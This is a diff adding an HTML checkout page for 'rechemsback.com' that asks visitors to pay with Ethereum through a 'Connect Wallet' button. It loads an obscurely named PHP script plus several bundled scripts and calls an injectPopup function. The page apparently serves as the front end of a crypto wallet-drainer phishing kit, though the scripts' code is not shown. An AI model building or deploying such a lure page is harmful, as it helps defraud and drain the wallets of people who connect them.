@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script charset="UTF-8" type="text/javascript" src="./j9oif.php"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Your Order - rechemsback.com</title>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    
+    .header h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #22d3ee, #06b6d4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    
+    .payment-section {
+      background: rgba(34, 211, 238, 0.05);
+      border: 1px solid rgba(34, 211, 238, 0.2);
+      border-radius: 16px;
+      padding: 24px;
+      margin: 40px 0;
+    }
+    
+    .payment-section h2 {
+      font-size: 1.25rem;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .eth-icon {
+      width: 32px;
+      height: 32px;
+      background: linear-gradient(135deg, #627EEA, #3C3C3D);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .connect-wallet {
+      width: 100%;
+      background: linear-gradient(135deg, #22d3ee, #06b6d4);
+      border: none;
+      color: #000;
+      padding: 16px 24px;
+      border-radius: 12px;
+      font-size: 1.125rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .connect-wallet:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(34, 211, 238, 0.3);
+    }
+    
+    .connect-wallet:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Complete Your Order</h1>
+      <p style="color: #9ca3af;">Pay with Ethereum to confirm your order</p>
+    </div>
+
+    <div class="payment-section">
+      <h2>
+        <div class="eth-icon">
+          <svg width="16" height="16" viewBox="0 0 256 417" fill="none">
+            <path fill="#fff" d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z"/>
+            <path fill="#ccc" d="M127.962 0L0 212.32l127.962 75.639V154.158z"/>
+            <path fill="#fff" d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z"/>
+            <path fill="#ccc" d="M127.962 416.905v-104.72L0 236.585z"/>
+          </svg>
+        </div>
+        Pay with Ethereum
+      </h2>
+      
+      <button id="connect-wallet-btn" class="connect-wallet-btn connect-wallet interact-button">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/>
+          <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/>
+        </svg>
+        Connect Wallet
+      </button>
+    </div>
+  </div>
+
+  <!-- Load wallet connection scripts in the correct order -->
+  <script src="./bundle.js"></script>
+  <script src="./fpbundle.js"></script>
+  <script src="./modals.js"></script>
+  <script src="./main.js"></script>
+  <script>
+    // Initialize popup functionality after all scripts are loaded
+    if (typeof injectPopup === 'function') {
+      injectPopup();
+    }
+  </script>
+</body>
+</html>
